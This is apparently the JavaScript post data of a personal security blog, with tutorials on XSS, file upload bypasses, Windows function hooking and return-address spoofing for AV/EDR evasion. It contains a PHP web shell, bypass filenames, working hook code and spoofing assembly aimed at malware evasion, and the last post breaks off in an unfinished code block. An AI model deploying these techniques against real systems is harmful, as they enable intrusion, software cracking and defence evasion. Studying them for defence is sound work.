// POST
// > title
// > content
// > song
// > songAuthor
// > songLink

const blogPosts = {
    "guide-to-xss": {
      title: "What_is_XSS?.blg",
      description: "This guide goes over the fundamentals of XSS (Cross-site scripting) and how it works, along with how it can be exploited.",
      song: "Is your online persona an untamed unfiltered version of yourself?",
      songAuthor: "Pisca",
      songLink: "https://www.youtube.com/embed/JKs--_lKYeo?si=0d2Hj7MbZG0Zzzez",
      image: "https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff08bfeb5-7faa-4270-a9e1-b81d353ec22d_1200x675.jpeg",
      date: "29-05-2025",
      content: `<p>XSS (A.K.A. Cross-site scripting) is the method of using html tags in a websites user input to display arbitrary data within a webpage, for example, using <code>&lt;h1&gt;Header&lt;h1/&gt;</code> within a comment in a
      blog to make your text a header element rather than what it would normally be display as.</p><br/>
      <h1>Looking for XSS</h1>
      <p>So let's say we're enumerating a website looking for possible attack vectors and we come across a search bar, we enter an item into it and it says the item we entered into that search bar back at us.. We could then enter
      something such as an image by typing <code>&lt;img src="{random_image}"/&gt;</code> into the search bar. If the website then returns an image back to us then this is an XSS vulnerability and can be abused.<br/><br/>
      <img style="display: block; margin: auto; width: 50%; padding: 10px;" src="/blogdata/29-05-25/xssInjection.png"/>
      <h1>Using XSS</h1>
      <p>So, what's the actual application of XSS to a hacker? Well, a lot. This allows a hacker to control a website and tell it to render certain html tags. So, for example, we can use something such as a
      <code>&lt;script/&gt;</code> tag and run any arbitrary code within the website we desire as if the website was serving us the script itself.<br/><br/>So, let's say you find a comment section within a website and use XSS to
      put your own script into that comment. Now, anyone who loads that comment on that webpage will be forced to run that code you made on their own browser, which could redirect them to a website ran by you which grabs their cookies,
      and many other helpful pieces of data that can help you infiltrate a website or gain access to something you shouldn't have access to.
      <br/><br/>This alone is why XSS is so powerful. You could force people to download malware on their computers with it, you can basically do <b>anything</b> on the client side.
      <h1>Caviats</h1>
      <p>Obviously, a ton of websites have caught onto this popular hack by now, and they do a large amount of <b>Input validation</b> to stop users from inputting html tags, getting around thsi can be quite a pain as it will
      likely take some bruteforcing to find something that works, which is why I highly recommend using an application like <a href="https://portswigger.net/burp">Burp Suite</a> to clone packets to your target and edit them from
      there. I'll likely make a blog post going over the basics of burp suite at some point if you're not too familiar with the software.<br/><br/>Within burp suite we can use the built in <b>Repeater Module</b> (found within the top
      bar when inside an instantiated burp suite project) and place our payload within where our search parameter, then, we can use something like <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Port
      Swiggers XSS cheat sheet</a> to test every single tag and event in every possible browser to see what type of XSS tags we can get past the input validation.<br/><br/>If this didn't make sense to you, don't worry, It probably
      didn't make sense to most people because I'm bad at explaining stuff. In simpler terms, the XSS cheat sheet provides us with every possible value we could enter to get an XSS vulnerability and returns the data for every search. If
      you're familiar with the concept of a brute-force attack, it's that.
      <h1>Going Further</h1>
      <p>If you'd like to try out XSS practically for yourself within a controlled environment, I'd recommend using the <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded">Port
      Swigger XSS labs</a>.
      `
    },
    "file-upload-vulnerabilities": {
      title: "File_Upload_Vulnerabilities.blg",
      description: "This guide will explain what a file upload vulnerability is and how one can use this vulnerability to gain access to a webapp using a reverse shell.",
      song: "Pills",
      songAuthor: "Yung Lain",
      songLink: "https://www.youtube.com/embed/LrwqD3wsxGw?si=9HBuylgF2OZywGSC",
      image: "https://w.wallhaven.cc/full/1j/wallhaven-1jl6gw.png",
      date: "01-08-2025",
      content: `<p>A file upload vulnerability occurs when a server allows the uploading of files to its filesystem and doesn't correctly sanitise the uploaded media. Failing to properly sanitise the uploaded file can lead to the execution
      of arbitrary scripts that could enable remote code execution.</p>
      <h1>How are these exploitable?</h1>
      <p>Access to a filesystem could be enough to deface a website entirely, it really just depends on how the server handles the upload in the backend and how a threat actor exploits it. However, the most common use of a file upload vulnerability
      you'll find is the uploading of a reverse shell. A reverse shell attack is a type of cyberattack where a threat actor establishes a connection to a target's machine by opening a connection remotely and then connecting to it. This
      open connection will then give them shell access; instantiating a foothold within the target machine that can be used to move vertically.</p>
      <h1>POST Requests</h1>
      <p>There are quite a few types of HTML requests you can make to a server that dictate what the server should do based on the request. The one that file uploads use is a POST request. Before we can exploit file uploads it's important
      we understand the structure of a POST request.</p>
      <img style="display: block; margin: auto; width: 80%; padding: 10px;" src="/blogdata/01-08-25/POST_Request_ANNOTATED.png"/>
      <p>- <b>POST REQUEST HEADER: </b>This is an indicator that this HTML request to the target is in fact a POST request.<br/><br/>
      - <b>TARGET DIR: </b>The directory that HTML request is trying to POST to.<br/><br/>
      - <b>TARGET: </b>The domain name of the site this request is being sent to.<br/><br/>
      - <b>FILENAME: </b>The name of the file being uploaded INCLUDING the file extension name.<br/><br/>
      - <b>MIME TYPE: </b>This specifies the type of file being uploaded and will differ between files being uploaded. For example, a JPG will have the MIME type of 'image/jpg' whereas a PDF would have 'application/pdf'. For a full guide
      to file types and their corresponding MIME types, <a href="https://developer.mozilla.org/en-US/docs/We/bHTTP/Guides/MIME_types/Common_types">Click here.</a><br/><br/>
      - <b>RAW BIN IMG DATA: </b>The raw data of the file being sent. The raw binary data of files hold byte sequences at the beginning of itself indicating what file type the file is. For example, the raw binary data of a PNG file would
      always preceed with <code>"‰PNG␍␊␚␊"</code>/<code>89 50 4E 47 0D 0A 1A 0A</code> before the actual raw image data.<br/><br/>
      - <b>DESCRIPTION OF IMAGE/USERNAME OF POSTER: </b>This is some extra information fed to the server with the request. In this specific scenario it was trying to dictate a description of the image being uploaded and the username of the
      user uploading it.<br/><br/></p>
      <h1>Validating Files</h1>
      <p>So, now we know all the information the HTTP server will receive, we can look at ways to use this data to confirm if an uploaded file is wanted or not. You may have noticed two important components of the POST request for this,
      those being the filename, MIME type and actual raw binary data. We can look at the contents of these and validate if the posted file holds the same contents of the file we want. So, let's go over how we'd validate these two
      properties.
      <br/><br/>- <b>MIME Type</b>: For this all we need to do is find the MIME type of the files we want to include, so, if we only wanted to receive PNG's we'd run an if statement to see if the MIME type is equal to 'image/png'. If it
      is then we can confirm that the uploaded file is legitimate in that regard.
      <br/><br/>- <b>Filename</b>: This one's a little more tricky, and it will mainly boil down to how the string is handled. But generally we want to check whatever follows the final "." within the filename and ensure that it's of
      a wanted file type. So, if the proceeding characters of the "." character in this string are "p","n" and "g" we can confirm that this is a png filetype.</p>
      <br/><br/>- <b>Magic Bytes</b>: These magic bytes found within the raw binary data can be cross referenced with the magic bytes of the file type you want. If you're only allowing a PNG upload and someone uploads a file
      with the magic bytes of a PHP file type then you can block the upload as it's not a PNG.</p>
      <h1>Bypassing Protection</h1>
      <p>Now we understand how files are sanitised, we can look at how we can manipulate the POST request to try and exploit bad implications of these defences. It's very important that you have some software setup to modify your
      POST requests before you send them to the server, one of the best softwares to do this is <a href="https://portswigger.net/burp/communitydownload">Burp Suite</a>.<br/><br/>
      Let's say we're trying to upload a .php file when a server is expecting a .png, as mentioned earlier, the server will most likely be expecting a MIME type of 'image/png', however since we're uploading a php file our MIME type
      will (by default) be 'application/x-httpd-php', so, we'll need to manually jump into the request and change the MIME type to image/png so the server doesn't pick up on this and allows us to pass the check. <i>Remember, the MIME
      type is stored under 'Content-Type' under the POST request!</i>. It's important to note under the right conditions, changing the MIME type may mangle the data inside as the server may treat the data differently as it interprets
      it as another file type.<br/><br/>
      <p>Now we can look at the filename property. If you've ever tried bypassing sanitisation on strings, you'll know there are plenty of possible methods to get around this, it's just about finding the right ones. I'll list a few
      below...<br/><br/>
      - <b>URL Encoding:</b> You could attempt to replace the "." before a file extension with "%2", the server may then see the filename as something such as 'file%2php' and then actually save the file decoded as 'file.php' getting around
      the string check.<br/><br/>
      - <b>Adding an extension:</b> A server may check a filename from left to right and look for a "." then the proceeding characters. As long as it finds the characters it wants after it may allow the file to pass. We can manipulate this
      by simply adding another file extension past the first one, making the filename look something like 'file.png.php'. Due to this the file would be saved as .php on the server and the '.png' would just become a part of the files actual
      name.<br/><br/>
      - <b>Null byte characters:</b> We may be able to force the server to cut off a certain part of the string. If we make the file name something like 'file.php%00.png' or 'file.php;.png' it will see that the end of the file has the
      wanted filename however when it goes to save it it could cut off the end of the filename due to the null byte character, saving it as 'file.php'<br/><br/>
      - <b>Trailing Characters:</b> Including something such as a '.' at the end of your filename making it something like 'file.php.' can make the server interpret the extension to not include a certain file extension if it's working
      via a blacklist compared to a whitelist.<br/><br/>
      - <b>Multibyte Unicode Characters:</b> Translating your file extension to its unicode form may allow it to pass the checks without being noticed however it may be translated to their plaintext form upon saving.<br/><br/>
      Finally, we can talk about Magic Bytes. I wont go into a deep explenation about how we can bypass checks regarding magic bytes as they're quite similar to the ones we just listed above. But the general idea is that your file should
      have the magic bytes of the file you're trying to mimic. So, if we were trying to upload a php file passed off as a .png we'd want to add the PNG magic bytes at the start of the raw binary data of the file (<code>"‰PNG␍␊␚␊"</code>).</p>
      <h1>Building Our Payload</h1>
      <p>Okay, here comes the main exploit, actually writing in our payload. In this example I'm going to show a simple shell php extension that will give us a remote handle the shell to execute arbitrary commands. When we're defining
      our payload it should be in the pervious mentioned 'Raw bin img data' section.<br/><br/>Here, i'm going to write <code>&lt;?php echo system($_GET['command']); ?&gt;</code>. Once this is done and I've put in the necessary edits to
      bypass the servers authentication i'll upload it and jump to the directory it's been uploaded on the server. (This tends to be publicly available on any website as long as the element is loaded somewhere, you could also just
      FUZZ to find the directory.)<br/><br/>
      Once we've found our file we can make a request that passes to the variable "command" we wrote the file to execute. So, if we wanted to do something like find out what user we're running under, we could make a GET request like this
      <code>website.com/example/exploit.php?command=whoami</code> which should return the user the program is running off. Now, this is *technically* shell access-- however, if we wanted to get a real shell into the server we could use a
      simple revshell (You can easily make commands for this at) <a href="https://www.revshells.com/">revshells.com</a> and just run that command as we listen for it on our own machine.<br/><br/>When it comes down to it, the payload isn't
      really the main part of this exploit-- we primarily just want to upload something that isn't supposed to be there. However most of the time upon finding an issue like this we'd want to probe deeper into the server which is why i've
      explained the reverse shell</p>
      <h1>Conclusion</h1>
      <p>A file upload vulnerability is a great way to get a foothold into a website however it requires an intricate knowledge of a servers backend or lazy sanitisation techniques to exploit. If you want to go further with some real
      resources or try out what you've learned in some labs I heavily recommend (as always) <a href="https://portswigger.net/web-security/file-upload">PortSwiggers documentation</a> on the vulnerability along with the labs they have
      to offer along with it. If you see any misinformation or things that could do with clarifying on this post feel free to contact me wherever is linked around the website.</p>`
    },
    "basics-of-hooking": {
      title: "Basics_Of_Hooking.blg",
      description: "This guide goes over the fundamentals of hooking, a practice where a function is forced to JMP to another via memory manipulation during runtime.",
      song: "Deadlight",
      songAuthor: "Nfract",
      songLink: "https://www.youtube.com/embed/b3gnsHmXnn8?si=wQUWihr_K1n7Uukh",
      image: "https://w.wallhaven.cc/full/0j/wallhaven-0jeldw.png",
      date: "02-08-2025",
      content: `<p>If you've ever interacted with a modified version of software such as a modded game or a cracked application, chances are you've used hooking before, but what actually is it? Hooking is a technique used by hackers to
      intercept and modify behaviour of software components. Imagine it like this.. If we had a software that ran a function <code>checkLicense()</code> that returned 'True' if someone had a valid license and could use the software, then
      hooking could be used to 'overwrite' the function and give a hacker control of how the software checks the license, which is a powerful ability to have. In this post I'll go over a basic hook creation program and how it works, for
      more advanced concepts such as trampoline hooks, you'll have to look elsewhere for now.</p>
      <h1>Conceptual Overview</h1>
      <p>Before we do anything we need to understand exactly how we create a hook in the first place. Luckily, it's not too hard of a concept to understand...
      <br/><br/>1. Get the memory address of the function we're hooking and the function we want to 'overwrite' it with
      <br/>2. Change the permissions of the memory we're writing to to PAGE_EXECUTE_READWRITE
      <br/>3. Write the new instructions to the starting bytes of the function we're overwriting
      <br/>4. Change the permissions of the memory we written to back to what it was originally (Optional but recommended)
      <br/><br/>Okay, now we've outlined the steps to actually do this, let's get into the code part. I'll be pulling all code referenced here from <a href="https://github.com/YourAva/PlatyHook/tree/master">My hooking Github Repo</a>.</p>
      <h1>Code Review</h1>
      <p>PlatyHook.cpp</p>
      <codeblock>#include &ltWindows.h&gt
#include &ltiostream&gt
#include "header.hpp"

int main() {
    std::string superSecretPassword = "Password123";
    hijack_me(superSecretPassword);
    create_hook(get_me_running, hijack_me);
    hijack_me(superSecretPassword);
  }</codeblock>
  <br/>
  <p>header.hpp</p>
      <codeblock>#include &ltWindows.h&gt
#include &ltiostream&gt
#include &ltstring&gt

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

BOOL hijack_me(std::string password) {
    std::cout << "[hijack_me()] Password: " << password << "\\n";
    return FALSE;
}

BOOL get_me_running(std::string password) {
    std::cout << "[get_me_running()] Password: " << password << "\\n";
    return TRUE;
}

NTSTATUS create_hook(LPVOID lpToRun, LPVOID lpTarget) {
    byte patch[14] = { 0xFF, 0x25,0x00,0x00,0x00,0x00 };
    DWORD oldProtect;
    byte oldData[14];

    okay("Found the memory address of get_me_running\\n\\t\\\\__%p", lpToRun);
    okay("Found the memory address of hijack_me\\n\\t\\\\__%p", lpTarget);

    memcpy(patch + 6, &lpToRun, sizeof(lpToRun));
    okay("JMP Injection has been written to patch[14]");

    VirtualProtect(lpTarget, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);

    memcpy(lpTarget, patch, sizeof(patch));

    VirtualProtect(lpTarget, sizeof(patch), oldProtect, &oldProtect);

    return STATUS_SUCCESS;
}</codeblock>

      <p><br/>Okay, first we'll take a look at the PlatyHook.cpp holding our entrypoint. As we can see here it's defining a string variable called <code>superSecretPassword</code> and then calling <code>hijack_me()</code> whilst passing
      in that variable as a parameter. Then, it runs <code>create_hook()</code> passing the <code>get_me_running()</code> and <code>hijack_me()</code> functions without their closing brackets to the LPVOID type before runnign <code>
      hijack_me()</code> one more time. So, let's take a deeper look at what these functions actually do.
      
      <br/><br/><code><b>hijack_me()</b></code> - This function prints out whatever variable was passed to it and then returns FALSE. In this example this will be the function we're trying to 'overwrite'
      <br/><code><b>get_me_running()</b></code> - This function prints out whatever variable was passed to it and then returns TRUE. In this example this will be the function we're trying to 'overwrite' <code>hijack_me()</code> with.
      
      <br/><br/>Now, let's get into the main grit of this code that actually creates the hook, the <code>create_hook()</code> function.
      </p>
      <h1>create_hook()</h1>
      <p>This function does all the steps mentioned earlier inside of the <a href=#conceptual-overview>Conceptual Overview</a>, if you haven't read that section yet I highly recommend it to understand the following section. Firstly, we
      need to grab the memory address of the functions we're going to be messing with, luckily, we already did this when calling the function. The function create_hook takes two LPVOID types. So, when we call the function if we pass two
      functions lacking their ending brackets it will automatically fetch the memory address they're located at. Easy enough!
      
      Next, we need to allow for writing in the space we're going to be writing to-- however, we don't actually **know** what we're writing yet, or the size of it. This is a necessary prerequisite to this step, so let's figure
      it out. You may have noticed the <code>byte patch[14] = { 0xFF, 0x25,0x00,0x00,0x00,0x00 };</code> at the start of the function definition. Especially observant readers may recognise this already to be a JMP assembly instruction.
      In short, it's telling the computer to move what memory it's executing to another part in memory. It's a bit like jumping ahead in a book. However, we haven't actually told the computer where it should jump to. Since we want to
      execute our own function, it needs to be the memory address of our <code>get_me_running()</code> function. So, to fully create our final instructions we need to do something like this <code>memcpy(patch + 6, &lpToRun, sizeof(lpToRun));</code>.
      If you're wondering why we're adding 6 to the starting address this is so we can miss the first opcode instructions telling the computer to JMP. Your instruction should conceptually look something like this now...
      <img src="/blogdata/02-08-25/jmp.png"></img><br/><br/>
      Now we have the instructions we want to execute in our source function we're going to write it, as I said a moment a go, we need to apply the correct permissions first which we'll do using the Windows <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect"><code>VirtualProtect()</code>
      </a> function. This takes four arguments...
      <br/>- <b>LPVOID lpAddress</b> - Where the span of memory address being changed should start
      <br/>- <b>SIZE_T dwSize</b> - The size of the span of memory being changed
      <br/>- <b>DWORD flNewProtect</b> - The new permissions being given to the space in memory
      <br/>- <b>PDWORD lpflOldProtect</b> - Pointer to a DWORD variable that can hold the old permission of that span of memory (we'll need this later)
      <br/>We're basically fully setup to run this function besides lpflOldProtect which can easily be defined: <code>DWORD oldProtect;</code>. Once that's defined, we can call the function like this <code>VirtualProtect(lpTarget, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);</code>
      <br/><br/>Now we can write to this memory, we'll make use of memcpy again. This time we'll feed it the starting memory address of our source function, the full instructions we want to inject and the size of those instructions <code> memcpy(lpTarget, patch, sizeof(patch));</code>
      and wallah, if we build and run this our second call of our source function should run whatever is inside of <code>get_me_running()</code>
      <br/><br/>We should also run a bit of cleanup and remove the edited permissions we provided to the memory address of our source function earlier, so we'll use the <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect"><code>VirtualProtect()</code></a>
      function again, passing in the source function's memory address and setting the flNewProtect parameter to the data we placed inside the <code>oldProtect</code> value last time we ran <code>VirtualProtect.</code> after we do this our
      hook is complete and should run fine!</p> 
      <h1>Troubleshooting</h1>
      <p>When it comes to troubleshooting programs like this truthfully there's not much advice I can give besides telling you to ensure you're compiling your program as an x64 program and decompiling it using a decompiler such as x64dbg.
      If you do decided to use x64dbg you can place <code>__debugbreak();</code> anywhere in your program to form a breakpoint, x64dbg will stop at these points whenever it comes to them so you can get a better understanding as to where
      you are in your programs execution.</p>
      <h1>Grabbing parameters</h1>
      <p>You may have noticed earlier that my <code>get_me_running()</code> function was grabbing the same string arguments my source function was. This is fully intentional. When you hook a function whatever function you redirect it to
      will be able to access the same arguments that were passed to the source function. This is why hooking is so popular when it comes to hacking games as it can allow a hacker to grab data such as an entity list which can help support
      their hacks, In the example code I've used it to grab the <code>superSecretPassword</code> I passed into the function at the beginning.</p>
      <h1>Conclusion</h1>
      <p>If you feel some concepts could use better clarification or you need some support in your programming feel free to contact me on any social media listed on the site and I'll try to see if I can help. Thanks for reading.</p>
      `},
      "return-address-spoofing": {
      title: "Return_Address_Spoofing.blg",
      description: "What is return address spoofing, how is it done, why is it done",
      song: "I Really Like You pt2",
      songAuthor: "Sewerslvt",
      songLink: "https://www.youtube.com/embed/NknuSpM0ji0?si=rEGXGOxsW86B8qlu",
      image: "/blogdata/17-12-25/background.jpg",
      date: "17-12-2025",
      content:`<p>Recently, I've been learning about a new technique in malware development to avoid detection called return address spoofing. This article will go over everything I've learned and how to do return address spoofing within x64
      architecture. All resources I've used to build my knowledge will be referenced in the <a href="#appendicies">Appendicies</a> section. Light understanding of assembly, x64 architecture and the stack is necessary for this post.</p>
      <h1>AV/EDR Behaviour</h1>
      <p>When a process such as Kernel32 tries to execute
      certain commands AV/EDR's will allow that spesific process to make these actions as it is a known process meaning it can't be doing anything malicious. However, when we develop software that
      does the same thing AV/EDR's aren't likely to allow us to do so because it's coming from an unknown, random process. The goal of Return Address Spoofing is to make AV/EDR's think our unknown software's calls
      are actually coming from these trusted programs.</p>
      <br/>
      <h1>Backed & Unbacked memory</h1>
      <p>This also links into "backed" and "unbacked" memory. When a process such as Kernel32 makes function calls, this is coming from a backed part of memory as the process has been mapped into the memory by Windows
      itself. However, if you're familiar with malware development, you'll know we tend to manually map malware into memory without the help of Windows meaning when we make function calls from our manually mapped
      programs, they are coming from unbacked memory. This is extremely suspicious and will be flagged by any good AV/EDR.</p>
      <br/>
      <p>To show how obvious a call from unbacked memory is, I've provided a screenshot of a manually mapped thread that creates a DialogBox being opened in
      <a href="https://systeminformer.sourceforge.io/">systemInformer</a>. I've left the code I used to create this <a href="/blogdata/17-12-25/unbackedMemoryFunctionCall.cpp">here</a> if you'd like to reproduce it.
      <br/>
      <img style="display: block; margin: auto; padding: 10px;" src="/blogdata/17-12-25/systemInformerUnbackedThread.png"></img>
      <br/>
      As you can see, the top of the stack holds a memory address of <code>0x28bc13301da</code>. An AV/EDR can easily see this arbitrary memory address making calls and will immediately flag it, Return Address Spoofing
      attempts to find a way around this.
      </p>
      <h1>Why use Return Address Spoofing?</h1>
      <p>Return address spoofing allows us to spoof the true caller of functions. This means when we call something like <a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa">
      MessageBoxA</a> from unbacked memory (something that would normally be flagged by AV/EDR) we can "spoof" the true caller of our unbacked memory to a trusted, backed memory address. In other words, it's like
      disguising our unbacked memory as backed, trusted memory. This makes return address spoofing a powerful tool for avoiding detection.</p>
      <h1>How does Return Address Spoofing work?</h1>
      <p>Firstly, we need to understand how we make it look like a function is being called from backed memory in the first place. Luckily, this is quite simple. When a CALL instruction is made in x64 architecture the
      address of the following instruction is pushed to the stack before execution is passed to the called function. This address that is pushed to the stack is known as the <b>return address</b>. So, when the called
      function reaches a RET instruction it will JMP to the supplied return address which should allow for the continued execution from where the function was called. The graphic below displays this process.
      </p>
      <img style="display: block; margin: auto; padding: 10px;" src=/blogdata/17-12-25/FunctionCallsOnTheStack.png/>
      <p>The return address is the memory address of what called the function in the first place meaning if the return address is of trusted & backed memory an AV/EDR will assume the function call
      is not malicious. This is the core idea of return address spoofing; taking the return address and making it return to trusted memory even if it wasn't called from trusted memory to trick AV/EDR into thinking
      the call is legitemate. We can then add an extra
      technique onto this by modifying a register used in a JMP call to make the trusted memory address JMP back to our malicious program. Here's a visual representation...</p>
      <img style="display: block; margin: auto; padding: 10px;" src=/blogdata/17-12-25/ReturnAddressSpoofingOnTheStack.png/>
      <h1>How to do Return Address Spoofing</h1>
      <p><i>For full transparency, all code here is derived from <a href="https://hulkops.gitbook.io/blog/red-team/x64-return-address-spoofing">hulkops.github.io</a> with slight modifications to make it's syntax
      work in C++. This is referenced in <a href="#appendicies">Appendicies</a> but I think this is important to disclose here also.</i></p>
      <br/>
      <p>The first step of return address spoofing is finding a trusted library we're going to spoof to. This library must have <code>jmp [rbx]</code> instructions within it as we are going to overwrite the contents
      of <code>rbx</code> to make the trusted library return to the memory address we supply. In this example, I'll be using Kernel32 however many other libraries can be implemented as long as it has
      the specified instructions.
      <br/><br/>
      The following code block is a function that will use GetModuleHandleA() to get a handle to the library we want (kernel32) by name. It will then use this handle to explore the NT Header of the library to find
      the size of it, then iterating throughout all the contents of the library based on the retrieved size for the <code>jmp [rbx]</code> instructions. Once we find the gadget within the library we return the pointer to the gadget.</p>
      <br/>
      <codeblock>UINT64 FindGadget() {
	PBYTE hModule = (PBYTE)GetModuleHandleA("kernel32");
	DWORD dwSize = ((PIMAGE_NT_HEADERS64)(hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew))->OptionalHeader.SizeOfImage;
	UINT64 pGadget = NULL;

	// Search for the Byte 0xFF 0X23, which correspond to the instruction "jmp [rbx]"
	for (int i = 0; i < dwSize - 1; i++) {
		if (hModule[i] == 0xff && hModule[i + 1] == 0x23) {
			pGadget = (UINT64)hModule + i;
			break;
		}
	}

	return pGadget;
}</codeblock><br/>
      <p>When we get to writing in assembly, we're going to need to be able to access our data in a controlled and easy way, so we'll create a structure and write to it with some parameters that will come in handy
      when we're writing in ASM.</p>
      <br/>
      <codeblock>typedef struct _STACK_CONFIG {
	PVOID pRopGadget;				// Address of target
	PVOID pTarget;					// The address of the function which needs to be called
	DWORD dwNumberOfArgs;			// The number of arguments the target function needs
	PVOID pEbx;						// Address of our liking when gadget is executed
	PVOID pArgs;					// Pointer to the arguments of target function
} STACK_CONFIG, * PSTACK_CONFIG;</codeblock><br/>
      <p>Finally, we'll make a function that populates this structure. Don't worry if you don't get why we're doing certain actions in our allocation (such as ensuring dwNumberOfTargets is even) as it will be explained
      in the following "Assembly" section.</p><br/>
      <codeblock>BOOL SetupConfig(PVOID pGadgets, PSTACK_CONFIG pConfig, PVOID pTarget, DWORD dwArgCount, ...) {

	va_list arg_list;

	// Initialising struct values

	pConfig->dwNumberOfArgs = (dwArgCount > 4) ? dwArgCount : 4;
	pConfig->dwNumberOfArgs += (dwArgCount % 2 != 0) ? 1 : 0;		 // Number of args is kept even to avoid complex steps in assembly to make sure the stack is aligned.
	pConfig->pTarget = pTarget;
	pConfig->pRopGadget = pGadgets;
	pConfig->pArgs = malloc(8 * pConfig->dwNumberOfArgs);

	if (!pConfig->pArgs) {
		DBG_PRINT("Unable to allocate memory for arguments.");
		return FALSE;
	}
	memset(pConfig->pArgs, 0x00, 8 * pConfig->dwNumberOfArgs);
	
	// Store argument values
	va_start(arg_list, dwArgCount);
	for (int i = 0; i < dwArgCount; i++) {
		((PUINT64)(pConfig->pArgs))[i] = va_arg(arg_list, UINT64);
	}

	DBG_PRINT("Successfully created config.");
	DBG_INT(pConfig->dwNumberOfArgs);
	DBG(pConfig->pTarget);
	DBG(pConfig->pRopGadget);
	DBG(pConfig->pArgs);

	return TRUE;
}</codeblock><br/>
      <h3>Assembly</h3>
      <p>x64 windows uses something called <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">fastcall</a>. In short, this means the first four <b>integer</b> arguments supplied
      to a function are stored in these registers in the following order...
      <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <code>RCX</code>
      <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <code>RDX</code>
      <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <code>R8</code>
      <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <code>R9</code>
      <br/>&nbsp;&nbsp;&nbsp;&nbsp;- Any other supplied arguments are placed onto the stack
      <br/>An odd number of arguments means a padding of 8 bytes will be at the bottom of the stack's argument listing to keep the stack aligned. In addition to this, before the function is called, 32 bits need to be
      allocated onto the stack. This is known as the "shadow space" and exists so the called function can save the contents of the first four volatile integer arguments stored on registers to memory if necessary.<br/>
      <br/>
      Now that's cleared up, let's make an external reference to the assembly code in C++ and get to writing our assembly.
      <br/><br/>
      <codeblock>extern "C" void* Spoof(STACK_CONFIG* pConfig);</codeblock>
      <br/>
      <p>Now we'll define our Spoof function in assembly. Firstly, we'll want to pop the real return address and store it elsewhere for now. Then, we'll populate the structure with necessary data such as the
      data in the previously mentioned registers where our first 4 arguments are stored.<p/>
      <br/>
      <codeblock>BITS 64
DEFAULT REL

STRUC Config
.pRopGadget: RESQ 1
.pTarget:	 RESQ 1
.dwArgCount: RESQ 1
.pRbx		 RESQ 1
.pArgs:		 RESQ 1
ENDSTRUC

GLOBAL Spoof
SECTION .text

Spoof:
	pop rdi									;pop the real return address and store in rdi register
	mov r10, rcx							;address of Config, which is passed as an argument in rcx
	mov r12d, [r10 + Config.dwArgCount]		;number of arguments are stored in r12, writing it to the struct + offset to the dwArgCount element.
	sub r12d, 4								;no. of arguments on stack, as the first 4 are stored in registers
	mov r13, [r10 + Config.pArgs]			;set r13 to the Config.pArgs offset to be added to right after.
	mov rcx, [r13]							;first arg
	mov rdx, [r13 + 8]						;second arg
	mov r8, [r13 + 16]						;third arg
	mov r9, [r13 + 24]						;fourth arg</codeblock><br/>
    <p>Once all arguments within the 4 registers have been applied, we need to loop through the stack for every argument that has been passed through it. We populate r12 with the total size of all stack arguments so
    we'll check if that register is equal to 0 at the start of our loop. If it isn't then we'll push the data in the following byte to the stack and decrement r12 by 8 before jumping back to the start of the loop once
    again.</p><br/>
    <codeblock>    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	; Loop To Move Arguments On The Stack
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		
	lea r12, [r12 * 8]						                ;calculating the size of additional arguments
	sub rsp, r12							                ;making space on the stack
        
loop_start:
	cmp r12, 0												;checking if the counter is zero
	jle loop_end
	mov r15, rsp											;copying stack pointer into temp variable
	add r15, r12											;address where argument needs to be written
	sub r15, 8	
	mov rax, [r13 + 24 + r12]								;copying argument into temp variable
	mov [r15], rax											;writing argument on the stack
	sub r12, 8												;decrementing the counter
	jmp loop_start</codeblock><br/>
    <p>Once the loop is complete, we'll add our shadow space and push the address of our gadget to the stack to make it our brand new return address. We then modify the value of rbx to the address of "cleanup" so
    when the gadget runs <code>JMP RBX</code> it will JMP to our cleanup code giving us control once again. Once this is complete, we can jump to our target function and let it execute with certainty it will
    be redirected back to us.</p><br/>
    <codeblock>loop_end:
	mov r13d, [r10 + Config.dwArgCount]						;storing the argument count a in non-volatile register	
	sub rsp, 32												;shadow space
	mov rax, [r10 + Config.pRopGadget]						;copying return address to temp variable (Gadget's address)
	push rax												;pushing the return address on the stack
	lea rbx, [cleanup]										;setting the value of rbx. ROP Gadget will jump to this address
	mov [r10 + Config.pRbx], rbx
	lea rbx, [r10 + Config.pRbx]
	mov r12, [r10 + Config.pTarget]						
	jmp r12</codeblock><br/>
    <p>Finally, we need to define cleanup which will simply revert the stack back to its original state and return us back to wherever Spoof was called from.</p><br/>
    <codeblock>cleanup:
	
	lea r13, [r13 * 8]
	add rsp, r13											;reverting stack to its original state
	jmp rdi</codeblock><br/>
  
    <h3>Bringing it all together</h3>
    <p>Now that's all done, all we need to do is just bring our code together within main and voilà, we've successfully created return address spoofing.</p><br/>
    <codeblock>#include "header.hpp"

